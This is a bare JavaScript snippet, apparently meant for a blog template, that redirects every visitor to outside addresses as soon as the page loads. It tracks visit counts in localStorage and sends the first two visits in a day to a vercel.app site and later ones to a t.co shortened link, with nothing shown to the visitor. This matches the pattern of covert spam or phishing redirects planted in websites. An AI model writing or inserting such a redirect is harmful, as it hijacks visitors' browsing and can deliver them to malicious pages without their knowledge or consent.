<script type='text/javascript'>
//<![CDATA[
(function(){
var A="https://sxee-54.vercel.app/",
    B="https://t.co/6fqL97ARPA",
    K="visit_redirect",
    R=86400000,
    n=Date.now(),
    d;

try{
 d=JSON.parse(localStorage.getItem(K));
}catch(e){
 d=null;
}

if(!d || n-d.time>=R){
 d={count:1,time:n};
}else{
 d.count++;
}

try{
 localStorage.setItem(K,JSON.stringify(d));
}catch(e){}

location.replace(d.count<=2?A:B);
})();
//]]>
</script>
